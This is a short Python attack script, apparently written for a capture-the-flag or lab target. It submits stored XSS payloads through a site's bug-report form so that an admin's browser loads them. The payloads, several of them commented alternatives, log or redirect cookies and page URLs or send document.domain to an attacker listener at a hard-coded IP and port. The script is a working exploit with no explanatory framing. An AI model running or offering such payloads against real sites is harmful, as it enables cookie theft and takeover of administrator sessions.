#!/usr/bin/env python3
from time import sleep
import requests
import urllib.parse

myip = '10.33.1.86'
myport = 8000
# script = '<script>console.log(top.cookie)</script>'
# script = '<img src=x onerror="console.log(top.cookie)">'
# script = f'<a href="http://{myip}:{myport}/index.php?id=bugReport&from=">test</a>'
# script = f'<img src="x" onerror="window.location.href=\'http://{myip}:{myport}?d=\'+window.location.href">'
script = f'<img src="http://{myip}:{myport}?x=server2&d="\'+document.domain+\'">\')</script>'
payload = f'data:text/html;charset=utf-8,{script}'

print(payload)
s = requests.session()
resp = s.post('http://10.10.10.3/bugReport.php',
              data={'url': f'http://10.10.10.3/?debug=true&url={urllib.parse.quote(payload)}'})

while True:
    if 'Thanks for your report! An admin will review your submission asap.' in resp.text:
        print("ok pending")
        break
    else:
        if "Only links to our wesbite are accepted. We can't fix bugs of others." in resp.text:
            print("Url not supported")
            break
        print('fail')
        sleep(1)
s.close()